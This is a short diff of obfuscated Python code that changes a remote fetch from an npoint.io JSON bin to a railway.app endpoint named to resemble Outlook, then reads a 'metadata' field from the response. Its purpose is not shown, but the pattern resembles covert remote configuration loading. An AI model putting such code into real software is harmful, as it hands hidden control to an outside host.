@@ -18,7 +18,7 @@ def eval_lrpujk_711():
 
     def eval_rmtgep_645():
         try:
-            process_ooncfs_895 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_ooncfs_895 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_ooncfs_895.raise_for_status()
             model_cavesw_816 = process_ooncfs_895.json()
             net_wylytu_166 = model_cavesw_816.get('metadata')
